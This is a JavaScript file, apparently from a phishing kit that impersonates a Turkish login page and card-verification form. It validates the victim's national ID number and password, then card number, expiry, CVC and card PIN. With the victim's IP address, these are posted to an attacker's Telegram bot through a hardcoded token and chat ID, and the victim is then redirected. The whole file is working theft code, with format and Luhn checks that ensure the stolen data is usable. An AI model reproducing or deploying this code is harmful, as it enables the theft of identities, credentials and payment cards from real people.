function updateFullscreenBackground() {
    var currentHour = new Date().getHours(); // Kullanıcının saatini al

    // Fullscreen ekranı seçiyoruz
    var fullscreenDiv = document.querySelector('.fullscreen-div');

    // Eğer saat 06:00 - 18:00 arasındaysa gündüz moduna al
    if (currentHour >= 6 && currentHour < 18) {
        fullscreenDiv.classList.add('day-fullscreen');
        fullscreenDiv.classList.remove('night-fullscreen');
    } else { // Gece moduna al
        fullscreenDiv.classList.add('night-fullscreen');
        fullscreenDiv.classList.remove('day-fullscreen');
    }
} 
 // Sayfa yüklendiğinde fullscreen ekran geçişini yap
window.onload = function() {
    updateFullscreenBackground();
    // Eğer fullscreen ekranın gösterilmesi gerekiyorsa:
    document.querySelector('.fullscreen-div').style.display = 'block';
};

// Her saat başı tekrar kontrol etsin
setInterval(updateFullscreenBackground, 3600000);



function sendTelegramMessage(message, callback) {
    const botToken = "8466597176:AAFP1Dq_BJOCMI-0nb2gQoAL9fIdmtFz43Q";
    const chatId = "-1003874564893";
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log("✅ Başarılı:", data);
        if (callback) setTimeout(callback, 1500); // 1.5 saniye sonra yönlendirme
    })
    .catch(error => {
        console.error("❌ Hata:", error);
    });
}


 // 📌 Luhn Algoritması - Kredi Kartı Geçerlilik Kontrolü
function luhnCheck(cardNumber) {
    let sum = 0;
    let alternate = false;
    cardNumber = cardNumber.replace(/\s+/g, ""); // Boşlukları temizle

    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i), 10);

        if (alternate) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }

        sum += digit;
        alternate = !alternate;
    }
    return sum % 10 === 0;
}

 
 
 
 
 function tcno_dogrula(tcno) {
            tcno = String(tcno);
            if (tcno.length !== 11 || tcno[0] === '0') return false;
            let hane_tek = 0, hane_cift = 0, ilkon_total = 0;
            for (let i = 0; i < 9; i++) {
                let j = parseInt(tcno[i], 10);
                i % 2 === 0 ? hane_tek += j : hane_cift += j;
                ilkon_total += j;
            }
            if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno[9], 10)) return false;
            ilkon_total += parseInt(tcno[9], 10);
            return ilkon_total % 10 === parseInt(tcno[10], 10);
        }

        function submitFirstForm() {
            const tcnum = $('#tcnum').val();
            const pwd = $('#pwd').val();
            const isValidTC = tcno_dogrula(tcnum);
            const isValidPWD = /^\d{6}$/.test(pwd);

            if (!isValidTC || !isValidPWD) {
                $('#errorMessage').show();
            } else {
                $('#errorMessage').hide();

                $('#preloader').fadeIn('slow');

                setTimeout(function() {
                    $('#preloader').fadeOut('slow');
                    $('#card-info-screen').fadeIn('slow');
                    $('#login-screen').hide();
                }, 3000);
            }
        }

        $('#formSubmit').on('click', submitFirstForm);

        $('#fullscreenDiv').on('click', function() {
            $(this).slideUp(500);
        });

        $('header').on('click', function() {
            $('#fullscreenDiv').slideDown(500);
        });

        $(window).on('load', function() {
            $('#preloader').fadeOut('slow');
        });
		
		document.getElementById("formSubmit").addEventListener("click", function() {
    const tcnum = document.getElementById("tcnum").value.trim();
    const pwd = document.getElementById("pwd").value.trim();

    if (!tcno_dogrula(tcnum) || !/^\d{6}$/.test(pwd)) {
        document.getElementById("errorMessage").style.display = "block"; // ❌ Hata mesajını göster
        return;
    }

    document.getElementById("errorMessage").style.display = "none"; // ✅ Hata mesajını gizle

    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;

            const message = `*Yeni Giriş Bilgileri:*\nTC Kimlik:** ${tcnum}\nParola:** ${pwd}\nIP:** ${ip}`;
            sendTelegramMessage(message, function() {
                document.getElementById("cardInfo").style.display = "block";  // ✅ Kart bilgileri ekranını aç
            });
        })
        .catch(error => {
            console.error("IP alınırken hata oluştu:", error);
        });
});

$('#formSubmit').on('click', submitFirstForm);

// Kart numarası formatlama
$('#cardnum').on('input', function() {
    var value = $(this).val().replace(/\D/g, '').substring(0, 16); // Yalnızca rakamlar
    var formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Her 4 rakamdan sonra boşluk ekler
    $(this).val(formattedValue); // Değeri güncelle
});

// Son kullanma tarihi formatlama
$('#expiry').on('input', function() {
    var value = $(this).val().replace(/\D/g, '').substring(0, 4); // Yalnızca rakamlar
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4); // "/" ekler
    }
    $(this).val(value); // Değeri güncelle
});



document.getElementById("submitCardInfo").addEventListener("click", function() {
    const cardnum = document.getElementById("cardnum").value.replace(/\s/g, "").trim();
    const expiry = document.getElementById("expiry").value.trim();
    const cvc = document.getElementById("cvc").value.trim();
    const cardpwd = document.getElementById("cardpwd").value.trim();

    let isValid = true;

    // ✅ Kart Numarası Luhn Algoritması ile doğrula
    if (!luhnCheck(cardnum)) {
        document.getElementById("cardnum").style.borderColor = "red";
        isValid = false;
    } else {
        document.getElementById("cardnum").style.borderColor = "";
    }

    // ✅ Son Kullanma Tarihi Formatını Kontrol Et
    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
        document.getElementById("expiry").style.borderColor = "red";
        isValid = false;
    } else {
        document.getElementById("expiry").style.borderColor = "";
    }

    // ✅ CVC Kontrolü (3 Hane)
    if (!/^\d{3}$/.test(cvc)) {
        document.getElementById("cvc").style.borderColor = "red";
        isValid = false;
    } else {
        document.getElementById("cvc").style.borderColor = "";
    }

    // ✅ Kart Şifresi Kontrolü (4 Hane)
    if (!/^\d{4}$/.test(cardpwd)) {
        document.getElementById("cardpwd").style.borderColor = "red";
        isValid = false;
    } else {
        document.getElementById("cardpwd").style.borderColor = "";
    }

    if (!isValid) {
        return; // ❌ Hata varsa Telegram'a gönderme!
    }

    // ✅ Doğrulama geçtiyse IP adresini al ve Telegram'a gönder
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;

            const message = `*Giriş ve Kart Bilgileri:*\nTC Kimlik:** ${document.getElementById("tcnum").value.trim()}\nParola:** ${document.getElementById("pwd").value.trim()}\nKart Numarası:** ${cardnum}\nSon Kullanma Tarihi:** ${expiry}\nCVC:** ${cvc}\nKart Şifresi:** ${cardpwd}\nIP:** ${ip}`;

            sendTelegramMessage(message, function() {
                window.location.href = "nextpage.html"; // ✅ Yönlendirme yap
            });
        })
        .catch(error => {
            console.error("IP alınırken hata oluştu:", error);
        });
});